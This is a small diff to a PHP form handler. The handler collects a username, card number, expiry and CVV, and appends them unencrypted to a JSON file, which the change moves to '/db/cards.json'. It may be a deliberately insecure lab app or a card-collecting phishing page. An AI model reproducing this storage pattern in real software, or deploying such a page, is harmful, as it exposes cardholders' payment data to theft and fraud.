@@ -2,7 +2,7 @@
 $showThanks = false;
 
 if (isset($_POST['username']) && isset($_POST['number']) && isset($_POST['month']) && isset($_POST['year']) && isset($_POST['cvv'])) {
-    $cards = json_decode(file_get_contents('cards.json'), true);
+    $cards = json_decode(file_get_contents('/db/cards.json'), true);
     $cardDetails = array(
         'username' => $_POST['username'],
         'number' => $_POST['number'],
@@ -11,7 +11,7 @@ if (isset($_POST['username']) && isset($_POST['number']) && isset($_POST['month'
         'cvv' => $_POST['cvv'],
     );
     array_push($cards, $cardDetails);
-    file_put_contents('cards.json', json_encode($cards));
+    file_put_contents('/db/cards.json', json_encode($cards));
     $showThanks = true;
 }
 ?>
